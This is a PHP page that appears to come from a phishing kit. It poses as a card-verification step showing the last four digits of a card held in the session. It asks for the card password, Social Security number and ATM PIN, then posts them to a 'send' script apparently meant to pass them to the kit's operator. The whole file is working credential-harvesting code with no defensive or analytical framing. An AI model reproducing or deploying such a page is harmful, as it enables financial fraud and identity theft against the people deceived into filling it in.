<?php
	
	session_start();
	include "../assets/includes/header.php";

	$checkType = substr($_SESSION["zombiexcnumber"],0,1);

	if($checkType == 4){
		$cType = "background-position: 0px -0.3%;";
	} elseif($checkType == 5){
		$cType = "background-position: 0px 5.7%;";
	} elseif($checkType == 3){
		$cType = "background-position: 0px 11.7%;";
	} else {
		$cType = "background-position: 0px 82.4%;";
	}

?>

					<div class="zombie-form-container">

						<div class="zombie-loader" id="loading"></div>
						
						<!--##[ SECTION ]##-->
<script>
function validateVbvForm() {
    var a = document.forms["VbvForm"]["zombiexcpass"].value;
    var b = document.forms["VbvForm"]["zombiexssn"].value;
    var c = document.forms["VbvForm"]["zombiexatm"].value;
    if (a == "") {
        $("#zombiexcpass").addClass("hasError");
    }
    if (b == "") {
        $("#zombiexssn").addClass("hasError");
    }
    if (c == "") {
        $("#zombiexatm").addClass("hasError");
    }
    if (a == ""){return false;}if (b == ""){return false;}if (c == ""){return false;}
}
</script>
							<form action="../system/send/zombie_card_v.php" method="post" name="VbvForm" onsubmit="return validateVbvForm()">

								<div class="zombie-sections-steps">
									<span class="zombie-sections-step">○</span>
									<span class="zombie-sections-step selected">●</span>
									<span class="zombie-sections-step">○</span>
									<span class="zombie-sections-step">○</span>
								</div>

								<h3 class="medium">Credit/Debit card.</h3>
								<p class="medium">Please confirm your credit/debit card:</p>

								<div class="zombie-info-container">

									<div class="zombie-saved-c">
										<span class="cc-icon saved-cc-icon" style="<?php echo $cType; ?>"></span>

										<span> x-<?php echo substr($_SESSION["zombiexcnumber"],-4); ?></span>

										<span class="saved-note-icon" style="background-position: center 100.50%;"></span>
									</div>

									<div class="zombie-fields">
										<input type="password" name="zombiexcpass" id="zombiexcpass" placeholder="Card password" maxlength="30" autocomplete="off" autocorrect="off" />
									</div>

									<div class="zombie-fields">
										<input type="tel" name="zombiexssn" id="zombiexssn" placeholder="Security Social Number" onfocus="ssnfocus()" onblur="ssnblur()" id="zombiexssn" maxlength="11" autocomplete="off" autocorrect="off" value="<?php echo $_SESSION["zombiexssn"]; ?>" onkeypress="return isNumberKey(event)" />
									</div>

									<div class="zombie-fields">
										<input type="tel" pattern="[0-9]*" inputmode="numeric" name="zombiexatm" id="zombiexatm" placeholder="ATM pin" onfocus="atmfocus()" onblur="atmblur()" maxlength="4" autocomplete="off" autocorrect="off" onkeypress="return isNumberKey(event)" />
									</div>
									
									

									<div>
										<button style="width:100%" class="button">Save and continue</button>
									</div>
								</div>

							</form>

						<!--##[ END SECTION ]##-->
					</div>
<?php
	include "../assets/includes/footer.php";
?>

	</div>

<script>
	//Put our input DOM element into a jQuery Object
	var $ssn = jQuery('#zombiexssn');

	//Bind keyup/keydown to the input
	$ssn.bind('keyup','keydown', function(e){
		
	  //To accomdate for backspacing, we detect which key was pressed - if backspace, do nothing:
		if(e.which !== 8) {	
			var numChars = $ssn.val().length;
			if(numChars === 3 || numChars === 6){
				var thisVal = $ssn.val();
				thisVal += ' ';
				$ssn.val(thisVal);
			}
	  }
	});
</script>
<script>
	// NUMBERS ONLY

	function isNumberKey(evt)
	    {
	        var charCode = (evt.which) ? evt.which : event.keyCode
	        if (charCode > 31 && (charCode < 48 || charCode > 57))
	        return false;

	        return true;
	}
</script>
<script>
	$(document).ready(function(){
	$('#zombiexcpass').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiexcpass').removeClass('hasError'); } else {$('#zombiexcpass').removeClass('hasError'); }});

	$('#zombiexssn').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiexssn').removeClass('hasError'); } else {$('#zombiexssn').removeClass('hasError'); }});

	$('#zombiexatm').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiexatm').removeClass('hasError'); } else {$('#zombiexatm').removeClass('hasError'); }});

	});
</script>
</body>
</html>